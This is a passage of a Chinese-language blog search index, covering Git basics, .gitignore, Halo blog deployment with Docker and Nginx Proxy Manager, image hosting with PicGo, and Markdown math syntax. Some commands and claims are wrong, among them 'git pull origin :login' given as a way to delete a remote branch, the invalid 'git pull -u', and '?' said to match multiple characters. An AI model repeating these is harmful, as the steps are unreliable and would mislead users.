进行版本回退（回退到工作区）\",\"# 回退到上一次提交的版本 $ git reset --hard HEAD^ # 回退到上上次提交的版本 $ git reset --hard HEAD^ $ git reset --hard HEAD~2 \",\"Git 的版本回退速度非常快，因为 Git 在内部有个指向当前版本的 HEAD 指针，当你回退版本的时候，Git 仅仅是把 HEAD 从指向 当前版本 ，改为指向 要回到的版本\",\"Git教程02.gif\",\"然后顺便把工作区的文件更新了。所以你让 HEAD 指向哪个版本号，你就把当前版本定位在哪。 如果回退错了，可以使用 git reflog 命令来查看所有的操作记录，可以通过前面的标识符（版本号）来回退 使用 git reset --soft 版本编号 可以回退到暂存区，用处：备注重写和版本合并\"]},{\"header\":\"git revert 和 git reset\",\"slug\":\"git-revert-和-git-reset\",\"contents\":[\"git reset 是回滚到对应的 commit-id，相当于是删除了 commit-id 以后的所有的提交，并且不会产生新的 commit-id 记录，如果要推送到远程服务器的话，需要强制推送-f\",\"git revert 是反做撤销其中的 commit-id，然后重新生成一个 commit-id。本身不会对其他的提交 commit-id 产生影响，如果要推送到远程服务器的话，就是普通的操作 git push 就可以 git reset：\",\"Git教程03.gif\",\"git revert：\",\"Git教程04.gif\"]},{\"header\":\"Git 分支\",\"slug\":\"git-分支\",\"contents\":[]},{\"header\":\"初识分支\",\"slug\":\"初识分支\",\"contents\":[\"git 分支，就是我们自己把我们的整个文件夹分成一个一个独立的区域\",\"比如我们在开发 登录 功能的时候，可以放在 login 分支下进行开发；在开发 列表 功能的时候，可以放在 list 分支下进行开发，大家互不干扰，每一个功能都是一个独立的功能分支，这样开发会更好\",\"git 在初始化的时候，会自动生成一个分支，叫做 master，是表示主要分支的意思\",\"我们可以自己开辟出很多独立分支\"]},{\"header\":\"分支管理\",\"slug\":\"分支管理\",\"contents\":[\"开辟一个分支，使用 git branch 分支名称 命令\",\"# 开辟一个login分支 $ git branch login \",\"查看一下当前分支情况，前面有个 * 的，并且有高亮显示的，表示你当前所处的分支\",\"# 查看当前分支情况 $ git branch \",\"切换分支（HEAD 指向会跟着一起变），使用 git checkout 分支名称 命令\",\"# 切换到master分支 $ git checkout master \",\"注意：切换分支时，记得将当前分支提交到暂存区（git add）\",\"合并分支，使用 git merge 分支名称 命令\",\"# 合并login分支到master分支 # 首先切换到master分支 $ git checkout master # 合并分支 $ git merge login \",\"删除分支，使用 git branch -d 分支名称 命令\",\"# 删除login分支 # 先切换到别的分支 $ git checkout master # 删除login分支 $ git branch -d login \"]},{\"header\":\"分支合并冲突\",\"slug\":\"分支合并冲突\",\"contents\":[\"分支合并后如有冲突，git 会在文件中标识出来，需要我们人工解决冲突\"]},{\"header\":\"初识团队协作\",\"slug\":\"初识团队协作\",\"contents\":[\"需要使用托管平台来实现，如 GitHub\"]},{\"header\":\"GitHub 远端仓库\",\"slug\":\"github-远端仓库\",\"contents\":[\"首先，登陆 GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库，在 Repository name 填入你的仓库名，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的 Git 仓库。\",\"目前，在GitHub上的这个仓库还是空的，GitHub告诉我们，可以从这个仓库克隆出新的仓库，也可以把一个已有的本地仓库与之关联，然后，把本地仓库的内容推送到GitHub仓库。\",\"现在，我们根据 GitHub 的提示，在本地的要上传的仓库下运行命令：\",\"$ git remote add origin git@github.com:你的账户名/你的仓库名.git # 如：$ git remote add origin git@github.com:zhf521/learngit.git # 这里的origin是你的远端库的别名，可以是任意的，以后你提交的时候就可以向origin提交即可 # 使用 $ git remote remove origin 命令即可删除,这里的origin是仓库的别名，可以使用git remote -v查看 \",\"使用 git remote -v 可以查看连接的远程库\"]},{\"header\":\"推送\",\"slug\":\"推送\",\"contents\":[\"使用 git push 推送\",\"$ git push origin master # 将本地分支推送到远程库（别名为origin）master分支上 \",\"加上 -u 参数即可以后只使用 git push 来推送\",\"$ git push -u origin master \"]},{\"header\":\"拉取\",\"slug\":\"拉取\",\"contents\":[\"使用 git pull 拉取更新的文件\",\"$ git pull origin master # 将远程库（别名为origin）master分支拉取到本地分支上 \",\"加上 -u 参数即可以后只使用 git pull 来推送\",\"$ git pull -u origin master \"]},{\"header\":\"克隆\",\"slug\":\"克隆\",\"contents\":[\"使用 git clone 仓库地址 克隆远程仓库里面的内容到本地==（注意：克隆只能克隆主分支）== 可以克隆别人的公开的仓库，也可以克隆自己的仓库，克隆别人的仓库，我们只能拿来用，修改后不能重新上传；克隆自己的仓库，我们修改后还可以再次上传更新\",\"# 直接克隆仓库 $ git clone 仓库地址 \"]},{\"header\":\"团队协作的分支管理\",\"slug\":\"团队协作的分支管理\",\"contents\":[\"本地分支推送到远程分支 使用 git push 推送\",\"$ git push origin login # 将本地分支推送到远程库（别名为origin）login分支上 \",\"注意：克隆只能克隆主分支，需要拉取分支 使用 git pull 拉取更新的文件\",\"$ git pull origin login # 将远程库（别名为origin）login分支拉取到本地分支上 \",\"删除远程分支\",\"$ git pull origin :login # 将远程库（别名为origin）login分支删除 \"]},{\"header\":\"跨团队协作\",\"slug\":\"跨团队协作\",\"contents\":[\"先 fork 到自己的仓库，然后修改，然后 pull request，等待原作者审核\"]},{\"header\":\"VSCode 集成 Git\",\"slug\":\"vscode-集成-git\",\"contents\":[\"VSCode 中已经集成了 Git .gitignore 文件可以忽略文件，这个文件将不会上传\"]},{\"header\":\"一图总结\",\"slug\":\"一图总结\",\"contents\":[\"Git教程05.png\"]}]},\"/software-tool/git/02-gitignore%E6%96%87%E4%BB%B6.html\":{\"title\":\"gitignore文件\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"在使用 git 过程中，我们可能有些文件不需要上传上去，比如一些缓存文件，生成的图片，运行环境的一些配置等等，这时就需要用到 .gitignore 文件来忽略掉这些文件\"]},{\"header\":\"创建. gitignore 文件\",\"slug\":\"创建-gitignore-文件\",\"contents\":[\"在要管理的根目录下（即 .git 文件夹同级目录中）创建一个 .gitignore\",\"# 创建.gitignore文件命令 $ touch .gitignore \"]},{\"header\":\"写入要忽略的文件或文件夹\",\"slug\":\"写入要忽略的文件或文件夹\",\"contents\":[\"使用 Vim 来写入\",\"# 命令 $ vim .gitignore \",\"使用 Vim 插入模式来编写，在文件末尾一行要写入 .gitignore 然后退出保存即可\",\"注意：.gitignore 只能忽略那些原来没有被 track 的文件，如果某些文件已经被纳入了版本管理中，则修改 .gitignore 是无效的。那么解决方法就是先把本地缓存删除（改变成未 track 状态），然后再提交\",\"# 命令 $ git rm -r --cached $ git add . $ git commit -m 'update .gitignore' \"]},{\"header\":\". gitignore 的格式规范\",\"slug\":\"gitignore-的格式规范\",\"contents\":[\"# 为注释\",\"可以使用 shell 所使用的正则表达式来进行模式匹配\",\"匹配模式最后跟 / 说明要忽略的是目录\",\"使用 ! 取反，（例如目录中包含 test.a，并且 .gitignore 文件中包含 *.[oa]，如果在文件中加入 !test.a 表明忽略除 test.a 文件以外的后缀名为 .a 或者 .o 的文件）\"]},{\"header\":\"配置语法\",\"slug\":\"配置语法\",\"contents\":[\"以斜杠 / 开头表示目录\",\"以星号 * 通配多个字符\",\"以问号 ? 通配多个字符\",\"以方括号 [] 包含单个字符的匹配列表\",\"以感叹号 ! 表示不忽略（跟踪）匹配到的文件或目录\",\"例如：\",\"*.a # 忽略所有 .a 结尾的文件 !lib.a # 但 lib.a 除外 /TODO # 仅仅忽略项目根目录下的 TODO 文件，不包括subdir/TODO build/ # 忽略 build/ 目录下的所有文件 doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt \",\"注意：git 对于 .gitignore 配置文件是按行从上到下进行规则匹配的，意味着如果前面的规则匹配的范围更大，则后面的规则将不会生效\"]}]},\"/software-tool/git/\":{\"title\":\"Git\",\"contents\":[]},\"/software-tool/halo/01-Halo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html\":{\"title\":\"Halo博客搭建\",\"contents\":[{\"header\":\"购买服务器\",\"slug\":\"购买服务器\",\"contents\":[\"需要购买服务器，内存至少 1G，这里以腾讯云为例，进入官网腾讯云选购自己的服务器即可，推荐轻量应用服务器。购买以后装入 centos 系统。 防火墙开放 8090 端口 \"]},{\"header\":\"安装 Docker\",\"slug\":\"安装-docker\",\"contents\":[\"以下为 centos 系统安装教程，其他系统请参照官网教程官网\"]},{\"header\":\"登录自己的服务器\",\"slug\":\"登录自己的服务器\",\"contents\":[\"Halo博客搭建03.png\"]},{\"header\":\"卸载旧版本\",\"slug\":\"卸载旧版本\",\"contents\":[\"sudo yum remove docker \\\\ docker-client \\\\ docker-client-latest \\\\ docker-common \\\\ docker-latest \\\\ docker-latest-logrotate \\\\ docker-logrotate \\\\ docker-engine \"]},{\"header\":\"更新、安装必备软件\",\"slug\":\"更新、安装必备软件\",\"contents\":[\"apt-get update && apt-get install -y wget vim \"]},{\"header\":\"获取安装包\",\"slug\":\"获取安装包\",\"contents\":[\"sudo yum install -y yum-utils \"]},{\"header\":\"设置镜像仓库\",\"slug\":\"设置镜像仓库\",\"contents\":[\"官方镜像：（比较慢，不推荐）\",\"sudo yum-config-manager \\\\ --add-repo \\\\ https://download.docker.com/linux/centos/docker-ce.repo \",\"阿里镜像仓库 ：（推荐）\",\"sudo yum-config-manager \\\\ --add-repo \\\\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo \"]},{\"header\":\"安装 docker\",\"slug\":\"安装-docker-1\",\"contents\":[\"安装前先更新 yum 软件包索引\",\"yum makecache fast \",\"安装 docker-ce（社区版-免费的）\",\"sudo yum install docker-ce docker-ce-cli containerd.io \"]},{\"header\":\"启动 docker\",\"slug\":\"启动-docker\",\"contents\":[\"sudo systemctl start docker \"]},{\"header\":\"判断是否成功安装 docker 查看版本\",\"slug\":\"判断是否成功安装-docker-查看版本\",\"contents\":[\"docker version \"]},{\"header\":\"设置 docker 开机自启动\",\"slug\":\"设置-docker-开机自启动\",\"contents\":[\"systemctl enable docker \"]},{\"header\":\"使用 Docker 部署 Halo\",\"slug\":\"使用-docker-部署-halo\",\"contents\":[\"建议查看官方教程 使用 Docker 部署 Halo\"]},{\"header\":\"进入后台安装\",\"slug\":\"进入后台安装\",\"contents\":[\"通过访问 IP：端口号即可访问安装引导界面 安装完即可\"]},{\"header\":\"购买域名 (可选)\",\"slug\":\"购买域名-可选\",\"contents\":[\"进入腾讯云官网腾讯云选购。 注意：服务器与域名最好选用同一厂商，不然可能会莫名报错，配置失败。 添加域名解析，如图 \"]},{\"header\":\"反向代理 (可选)\",\"slug\":\"反向代理-可选\",\"contents\":[]},{\"header\":\"安装 Docker Compose\",\"slug\":\"安装-docker-compose\",\"contents\":[]},{\"header\":\"下载安装\",\"slug\":\"下载安装\",\"contents\":[\"sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose \",\"推荐使用下面这个，国内访问较快\",\"sudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose \"]},{\"header\":\"给执行权限\",\"slug\":\"给执行权限\",\"contents\":[\"sudo chmod +x /usr/local/bin/docker-compose \"]},{\"header\":\"查看 docker-compose 版本\",\"slug\":\"查看-docker-compose-版本\",\"contents\":[\"docker-compose --version \"]},{\"header\":\"部署 Nginx Proxy Manager 服务\",\"slug\":\"部署-nginx-proxy-manager-服务\",\"contents\":[]},{\"header\":\"创建一个与此类似的 docker-compose. yml 文件\",\"slug\":\"创建一个与此类似的-docker-compose-yml-文件\",\"contents\":[\"mkdir ~/npm #创建一个目录用来安装此服务 cd ~/npm #进入目录 \",\"vim docker-compose.yml #将以下代码粘贴到里面然后保存退出 \",\"version: \\\"3\\\" services: app: image: 'jc21/nginx-proxy-manager:latest' restart: unless-stopped ports: # These ports are in format <host-port>:<container-port> - '80:80' # Public HTTP Port - '443:443' # Public HTTPS Port - '81:81' # Admin Web Port # Add any other Stream port you want to expose # - '21:21' # FTP environment: DB_MYSQL_HOST: \\\"db\\\" DB_MYSQL_PORT: 3306 DB_MYSQL_USER: \\\"npm\\\" DB_MYSQL_PASSWORD: \\\"npm\\\" DB_MYSQL_NAME: \\\"npm\\\" # Uncomment this if IPv6 is not enabled on your host # DISABLE_IPV6: 'true' volumes: - ./data:/data - ./letsencrypt:/etc/letsencrypt depends_on: - db db: image: 'jc21/mariadb-aria:latest' restart: unless-stopped environment: MYSQL_ROOT_PASSWORD: 'npm' MYSQL_DATABASE: 'npm' MYSQL_USER: 'npm' MYSQL_PASSWORD: 'npm' volumes: - ./data/mysql:/var/lib/mysql \"]},{\"header\":\"在当前目录运行以下命令安装此服务\",\"slug\":\"在当前目录运行以下命令安装此服务\",\"contents\":[\"sudo docker-compose up -d #部署服务 \"]},{\"header\":\"安装完以后进入 81 端口登录\",\"slug\":\"安装完以后进入-81-端口登录\",\"contents\":[\"默认登陆名和密码： Email: admin@example. com Password: changeme 按如下图设置即可\",\"Halo博客搭建05.gif\",\"最后就可以通过域名进行访问了\"]},{\"header\":\"开始写博客\",\"slug\":\"开始写博客\",\"contents\":[\"配置好图床使用 GitHub 图床或阿里云对象存储搭建图床，使用 MarkDown 语法就可以愉快的发布文章啦!\"]}]},\"/software-tool/halo/\":{\"title\":\"Halo\",\"contents\":[]},\"/software-tool/image-hosting-website/01-%E9%98%BF%E9%87%8C%E4%BA%91%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A.html\":{\"title\":\"阿里云对象存储搭建图床\",\"contents\":[{\"header\":\"开通阿里云对象存储服务\",\"slug\":\"开通阿里云对象存储服务\",\"contents\":[\"进入官网，开通阿里云对象存储服务\"]},{\"header\":\"创建 Bucket\",\"slug\":\"创建-bucket\",\"contents\":[\"进入控制台，选择 Bucket 列表，创建 Bucket\",\"阿里云对象存储搭建图床01.png\",\"填写信息 注意：1. 存储类型选择标准存储2. 读写权限选择公共读\",\"阿里云对象存储搭建图床02.png\",\"然后点击设置的 Bucket，然后点击 Bucket 下的概览 在 访问域名 一栏找到你的地域节点，后面会用到\",\"阿里云对象存储搭建图床03.png\"]},{\"header\":\"管理 Accesskey\",\"slug\":\"管理-accesskey\",\"contents\":[\"点击头像，选择 Accesskey 管理\",\"阿里云对象存储搭建图床04.png\",\"在弹出的选项框里，选择“继续使用” 进入后，创建一个 AccessKey 在弹出的界面里，记住你的 accessKeyId 和 accessKeySecret\"]},{\"header\":\"购买存储包\",\"slug\":\"购买存储包\",\"contents\":[\"阿里云对象存储搭建图床05.png\",\"购买完成后还要充值余额，即需要购买流量。\"]},{\"header\":\"配置 PicGo\",\"slug\":\"配置-picgo\",\"contents\":[\"下载 PicGo，官网 PicGo，安装完成。 打开图床设置 在图床设置里面选择阿里云 OSS，依照以下步骤填写信息\",\"设定 KeyId：填写刚刚获得的 AccessKeyID\",\"设定 KeySecret：填写 AccessKeyIDSecret\",\"设定储存空间名：填写 bucket 名称，这里填写的是 bucket 名称，不是浏览器里的域名\",\"确认存储区域：填写你的地域节点，注意复制的格式\",\"指定存储路径：其实就是自定义一个文件夹的名字，以/结尾 设置完成\",\"阿里云对象存储搭建图床06.png\",\"它会自动在你的 bucket 里面创建一个文件夹，并把图片上传进去\"]}]},\"/software-tool/image-hosting-website/02-GitHub%E5%9B%BE%E5%BA%8A.html\":{\"title\":\"GitHub图床\",\"contents\":[{\"header\":\"创建一个仓库\",\"slug\":\"创建一个仓库\",\"contents\":[\"首先创建一个仓库\",\"GitHub图床01.png\"]},{\"header\":\"设置 token\",\"slug\":\"设置-token\",\"contents\":[\"点击头像，点击设置\",\" 点击开发者设置\",\"GitHub图床03.png\",\"设置个人访问令牌\",\"GitHub图床04.png\",\"设置完成以后请务必复制并保存 token\"]},{\"header\":\"下载 PicGo\",\"slug\":\"下载-picgo\",\"contents\":[\"官网 PicGo 下载完成并安装\"]},{\"header\":\"设置 GitHub 图床\",\"slug\":\"设置-github-图床\",\"contents\":[\" 确定即可，上传图片验证是否成功\",\"注意：如果上传失败，请关闭加速器\"]}]},\"/software-tool/image-hosting-website/\":{\"title\":\"图床\",\"contents\":[]},\"/software-tool/markdown/01-MarkDown%E8%AF%AD%E6%B3%95.html\":{\"title\":\"MarkDown语法\",\"contents\":[{\"header\":\"标题\",\"slug\":\"标题\",\"contents\":[\"# 标题名字（井号的个数代表标题的级数） \",\"一级标题使用 1 个#\",\"二级标题使用 2 个#\",\"三级标题使用 3 个#\",\"四级标题使 4 用个#\",\"五级标题使用 5 个#\",\"六级标题使用 6 个#\",\"最多支持六级标题#\"]},{\"header\":\"文字\",\"slug\":\"文字\",\"contents\":[]},{\"header\":\"删除线\",\"slug\":\"删除线\",\"contents\":[\"这就是 ~~删除线~~ (使用波浪号) \",\"这就是 删除线 (使用波浪号)\"]},{\"header\":\"斜体\",\"slug\":\"斜体\",\"contents\":[\"这是用来 *斜体* 的 _文本_ \",\"这是用来 斜体 的 文本\"]},{\"header\":\"加粗\",\"slug\":\"加粗\",\"contents\":[\"这是用来 **加粗** 的 __文本__ \",\"这是用来 加粗 的 文本\"]},{\"header\":\"斜体+加粗\",\"slug\":\"斜体-加粗\",\"contents\":[\"这是用来 ***斜体+加粗*** 的 ___文本___ \",\"这是用来 斜体+加粗 的 文本\"]},{\"header\":\"下划线\",\"slug\":\"下划线\",\"contents\":[\"下划线是 HTML 语法\",\"下划线 下划线 (快捷键 ctrl + u) \"]},{\"header\":\"高亮（需勾选扩展语法）\",\"slug\":\"高亮-需勾选扩展语法\",\"contents\":[\"这是用来 ==斜体+加粗== 的文本 \",\"这是用来 斜体+加粗 的文本\"]},{\"header\":\"符号及数学公式\",\"slug\":\"符号及数学公式\",\"contents\":[]},{\"header\":\"下标 (需勾选扩展语法)\",\"slug\":\"下标-需勾选扩展语法\",\"contents\":[\"水 $H_2O$ 双氧水 $H_2O_2$ \",\"水 H2​O 双氧水 H2​O2​\"]},{\"header\":\"上标 (需勾选扩展语法)\",\"slug\":\"上标-需勾选扩展语法\",\"contents\":[\"面积 $m^2$ 体积 $m^3$ 3的xy次方 $3^{xy}$ \",\"面积 m2 体积 m3 3 的 xy 次方 3xy\"]},{\"header\":\"运算符\",\"slug\":\"运算符\",\"contents\":[\"乘号: $\\\\times$ $10 = 2 \\\\times 5$ 除号: $\\\\div$ 加减号: $\\\\pm$ 开方：$\\\\sqrt{ x }$ 开n次方：$\\\\sqrt[ n ]{ x }$ \",\"乘号: ×10=2×5 除号: ÷ 加减号: ± 开方：x​ 开 n 次方：nx​\",\"如果要把符号往正上方或者正下方放\",\"比如 :\",\"$\\\\max \\\\limits_{x_0}$ $\\\\min \\\\limits^{x_0}$ $\\\\min \\\\limits^{x_0}_{x_0}$ \",\"x0​max​minx0​x0​minx0​​\",\"但 limits 只允许用于运算符上, 其他的不行\"]},{\"header\":\"向量\",\"slug\":\"向量\",\"contents\":[\"$\\\\vec{ a }$ $\\\\vec a \\\\cdot \\\\vec b = 0$ \",\"aa⋅b=0\"]},{\"header\":\"微积分\",\"slug\":\"微积分\",\"contents\":[\"$\\\\int_0^2 x^2 {\\\\rm d}x$ $\\\\lim\\\\limits_{n \\\\rightarrow +\\\\infty} \\\\frac{1}{n(n+1)}$ \",\"∫02​x2dxn→+∞lim​n(n+1)1​\"]},{\"header\":\"求和求极限\",\"slug\":\"求和求极限\",\"contents\":[\"$\\\\sum_{i = 1}^n{x_i}$ $\\\\sum\\\\limits_{i = 1}^n{x_i}$ $\\\\sum_{i=0}^n \\\\frac{1}{i^2}$ $\\\\sum\\\\limits_{i=0}^n \\\\frac{1}{i^2}$ $\\\\frac{\\\\sum_{i = 1}^n{x_i}}{n}$ $\\\\prod_{i=0}^n \\\\frac{1}{i^2}$ \",\"∑i=1n​xi​i=1∑n​xi​∑i=0n​i21​i=0∑n​i21​n∑i=1n​xi​​∏i=0n​i21​\"]},{\"header\":\"括号\",\"slug\":\"括号\",\"contents\":[\"$\\\\{ \\\\}$ ${a\\\\choose b}$ $\\\\frac{x}{y}$ $\\\\left ()\\\\right.$ \",\"{}(ba​)yx​()\"]},{\"header\":\"省略号\",\"slug\":\"省略号\",\"contents\":[\"跟文本底线对齐的省略号 $\\\\ldots$ 横向的省略号 $\\\\cdots$ 竖向的省略号 $\\\\vdots$ 对角线方向的省略号 $\\\\ddots$ \",\"跟文本底线对齐的省略号 … 横向的省略号 ⋯ 竖向的省略号 ⋮ 对角线方向的省略号 ⋱\"]},{\"header\":\"数学符号\",\"slug\":\"数学符号\",\"contents\":[\"因为：$\\\\because$ 所以：$\\\\therefore$ 任意：$\\\\forall$ 存在：$\\\\exists$ ∣ ：$\\\\mid$ \\\\ ：$\\\\backslash$ ∗ ：$\\\\ast$ ≤ ：$\\\\leq$ ≥ ：$\\\\geq$ ≠ ：$\\\\neq$ ≈ ：$\\\\approx$ ≡ ：$\\\\equiv$ ∑ ：$\\\\sum$ ∏ ：$\\\\prod$ ∐ ：$\\\\coprod$ ⨀ ：$\\\\bigodot$ ⨂ ：$\\\\bigotimes$ ⨁ ：$\\\\bigoplus$ \",\"因为：∵ 所以：∴ 任意：∀ 存在：∃ ∣ ：∣ \\\\ ：\\\\ ∗ ：∗ ≤ ：≤ ≥ ：≥ ≠ ：= ≈ ：≈ ≡ ：≡ ∑ ：∑ ∏ ：∏ ∐ ：∐ ⨀ ：⨀ ⨂ ：⨂ ⨁ ：⨁\"]},{\"header\":\"百分号、约等号\",\"slug\":\"百分号、约等号\",\"contents\":[\"$\\\\%$ $\\\\approx$ \",\"%≈\"]},{\"header\":\"向上/下取整\",\"slug\":\"向上-下取整\",\"contents\":[\"向上: $\\\\lceil$ $\\\\rceil$ 向下: $\\\\lfloor$ $\\\\rfloor$ $\\\\lceil$\\\\frac{4}{5}$\\\\rceil$ $\\\\lfloor$\\\\frac{4}{5}$\\\\rfloor$ \",\"向上:\",\"⌈⌉\",\"向下:\",\"⌊⌋\",\"⌈54​⌉⌊54​⌋\"]},{\"header\":\"希腊字母\",\"slug\":\"希腊字母\",\"contents\":[\"希腊字母\",\"写法\",\"希腊字母\",\"写法\",\"α\",\"$\\\\alpha$\",\"β\",\"$\\\\beta$\",\"γ\",\"$\\\\gamma$\",\"Γ\",\"$\\\\Gamma$\",\"δ\",\"$\\\\delta$\",\"Δ\",\"$\\\\Delta$\",\"ϵ\",\"$\\\\epsilon$\",\"ε\",\"$\\\\varepsilon$\",\"ζ\",\"$\\\\zeta$\",\"η\",\"$\\\\eta$\",\"θ\",\"$\\\\theta$\",\"Θ\",\"$\\\\Theta$\",\"ϑ\",\"$\\\\vartheta$\",\"ι\",\"$\\\\iota$\",\"κ\",\"$\\\\kappa$\",\"λ\",\"$\\\\lambda$\",\"Λ\",\"$\\\\Lambda$\",\"μ\",\"$\\\\mu$\",\"ν\",\"$\\\\nu$\",\"ξ\",\"$\\\\xi$\",\"Ξ\",\"$\\\\Xi$\",\"π\",\"$\\\\pi$\",\"Π\",\"$\\\\Pi$\",\"ϖ\",\"$\\\\varpi$\",\"ρ\",\"$\\\\rho$\",\"ϱ\",\"$\\\\varrho$\",\"σ\",\"$\\\\sigma$\",\"Σ\",\"$\\\\Sigma$\",\"ς\",\"$\\\\varsigma$\",\"τ\",\"$\\\\tau$\",\"υ\",\"$\\\\upsilon$\",\"Υ\",\"$\\\\Upsilon$\",\"ϕ\",\"$\\\\phi$\",\"Φ\",\"$\\\\Phi$\",\"φ\",\"$\\\\varphi$\",\"χ\",\"$\\\\chi$\",\"ψ\",\"$\\\\psi$\",\"Ψ\",\"$\\\\Psi$\",\"Ω\",\"$\\\\Omega$\",\"ω\",\"$\\\\omega$\"]},{\"header\":\"集合运算符\",\"slug\":\"集合运算符\",\"contents\":[\"∅: $\\\\emptyset$ ∈: $\\\\in$ ∉: $\\\\notin$ ⊂: $\\\\subset$ ⊃: $\\\\supset$ ⊆: $\\\\subseteq$ ⊇: $\\\\supseteq$ ⋂: $\\\\bigcap$ ⋃: $\\\\bigcup$ ⋁: $\\\\bigvee$ ⋀: $\\\\bigwedge$ ⨄: $\\\\biguplus$ ⨆: $\\\\bigsqcup$ $A\\\\\\\\2$ \",\"∅: ∅ ∈: ∈ ∉: ∈/ ⊂: ⊂ ⊃: ⊃ ⊆: ⊆ ⊇: ⊇ ⋂: ⋂ ⋃: ⋃ ⋁: ⋁ ⋀: ⋀ ⨄: ⨄ ⨆: ⨆A2\"]},{\"header\":\"对数符号\",\"slug\":\"对数符号\",\"contents\":[\"log:$\\\\log$ lg:$\\\\lg$ ln:$\\\\ln$ \",\"log: log lg: lg ln: ln\"]},{\"header\":\"箭头符号\",\"slug\":\"箭头符号\",\"contents\":[\"↑:$\\\\uparrow$ ↓:$\\\\downarrow$ ⇑:$\\\\Uparrow$ ⇓:$\\\\Downarrow$ →:$\\\\rightarrow$ ←:$\\\\leftarrow$ ⇒:$\\\\Rightarrow$ ⇐:$\\\\Leftarrow$ ⟶:$\\\\longrightarrow$ ⟵:$\\\\longleftarrow$ ⟹:$\\\\Longrightarrow$ ⟸:$\\\\Longleftarrow$ $\\\\stackrel{+}{\\\\Rightarrow}$ $\\\\stackrel{*}{\\\\Rightarrow}$ \",\"↑: ↑ ↓: ↓ ⇑: ⇑ ⇓: ⇓ →: → ←: ← ⇒: ⇒ ⇐: ⇐ ⟶: ⟶ ⟵: ⟵ ⟹: ⟹ ⟸: ⟸⇒+⇒∗\"]},{\"header\":\"三角运算符\",\"slug\":\"三角运算符\",\"contents\":[\"⊥:$\\\\bot$ ∠:$\\\\angle$ 度数:$30^\\\\circ$ sin:$\\\\sin$ cos:$\\\\cos$ tan:$\\\\tan$ cot:$\\\\cot$ sec:$\\\\sec$ csc:$\\\\csc$ \",\"⊥: ⊥ ∠: ∠ 度数: 30∘ sin: sin cos: cos tan: tan cot: cot sec: sec csc: csc\"]},{\"header\":\"分段函数的写法\",\"slug\":\"分段函数的写法\",\"contents\":[\"用法：\\\\begin{cases}xxxxxxx \\\\\\\\ xxxxxxx \\\\end{cases}\",\"$L(Y,f(x))=\\\\begin{cases}1, Y!=f(x) \\\\\\\\0, Y = f(x)\\\\end{cases}$ \",\"L(Y,f(x))={1,Y!=f(x)0,Y=f(x)​\",\"$L(Y,f(x))=\\\\begin{cases}1, Y!=f(x) \\\\\\\\0, Y = f(x)\\\\\\\\ -1,Y=\\\\infty \\\\end{cases}$ \",\"L(Y,f(x))=⎩⎨⎧​1,Y!=f(x)0,Y=f(x)−1,Y=∞​\",\"$M_p=\\\\begin{cases}x_{([np]+1)} {\\\\quad}{\\\\quad} np不是整数 \\\\\\\\ \\\\frac{1}{2}(x_{(np)}+x_{(np+1)}) {\\\\quad}{\\\\quad} np为整数\\\\end{cases}$ \",\"Mp​={x([np]+1)​np不是整数21​(x(np)​+x(np+1)​)np为整数​\"]},{\"header\":\"在数学公式中加空格\",\"slug\":\"在数学公式中加空格\",\"contents\":[\"${\\\\quad}$ : 输出一个空格\",\"${\\\\,}$ : 输出半个空格\",\"在数学模式下如果输不出空格就先加大括号 {}; 在复杂的公式下可能识别不出, 就需要加 {}\",\"空格宽度\",\"写法\",\"示例 : x y\",\"两个空格\",\"$x \\\\qquad y$\",\"xy\",\"一个空格\",\"$x \\\\quad y$\",\"xy\",\"大空格\",\"$x \\\\ y$\",\"xy\",\"中等空格\",\"$x \\\\; y$\",\"xy\",\"小空格\",\"$x\\\\,y$\",\"xy\",\"紧贴\",\"$x\\\\!y$\",\"xy\"]},{\"header\":\"绝对值\",\"slug\":\"绝对值\",\"contents\":[\"$|\\\\overline{x}|$ $|x|$ \",\"∣x∣∣x∣\"]},{\"header\":\"输出矩阵\",\"slug\":\"输出矩阵\",\"contents\":[\"$\\\\begin{matrix} 1 & 2 & 3 \\\\\\\\ 4 & 5 & 6 \\\\\\\\ 7 & 8 & 9 \\\\end{matrix}$ \\\\\\\\:换行 \",\"147​258​369​\"]},{\"header\":\"带大圆括号的矩阵\",\"slug\":\"带大圆括号的矩阵\",\"contents\":[\"$\\\\left( \\\\begin{matrix} 1 & 2 & 3 \\\\\\\\ 4 & 5 & 6 \\\\\\\\ 7 & 8 & 9 \\\\end{matrix} \\\\right)$ \",\"​147​258​369​​ 格式 : \\\\left( : 代表左圆括号 \\\\right) : 代表右圆括号\"]},{\"header\":\"带中/方括号的矩阵\",\"slug\":\"带中-方括号的矩阵\",\"contents\":[\"$\\\\left[ \\\\begin{matrix} 1 & 2 & 3 \\\\\\\\ 4 & 5 & 6 \\\\\\\\ 7 & 8 & 9 \\\\end{matrix} \\\\right]$ \",\"​147​258​369​​ 格式 : \\\\left[ : 代表左中括号 \\\\right] : 代表右中括号\"]},{\"header\":\"带大括号的矩阵\",\"slug\":\"带大括号的矩阵\",\"contents\":[\"$\\\\left\\\\{ \\\\begin{matrix} 1 & 2 & 3 \\\\\\\\ 4 & 5 & 6 \\\\\\\\ 7 & 8 & 9 \\\\end{matrix} \\\\right\\\\}$ \",\"⎩⎨⎧​147​258​369​⎭⎬⎫​ 格式 : \\\\left\\\\{ : 代表左大括号 \\\\right\\\\} : 代表右大括号\"]},{\"header\":\"阵列\",\"slug\":\"阵列\",\"contents\":[\"$\\\\begin{array}{c|ccc} {↓}&{a}&{b}&{c}\\\\\\\\ \\\\hline {R_1}&{c}&{b}&{a}\\\\\\\\ {R_2}&{b}&{c}&{c}\\\\\\\\ \\\\end{array}$ \",\"↓R1​R2​​acb​bbc​cac​​\",\"需要 array 环境：起始、结束处以 {array} 声明\",\"对齐方式：在{array}后以 \",\"左对齐：l ；剧中：c；右对齐：r\",\"竖直线：在声明对齐方式时，插入 | 建立竖直线\",\"$\\\\begin{array}{r|c|c|l|} {p}&{x}&{y}&{z}\\\\\\\\ \\\\hline 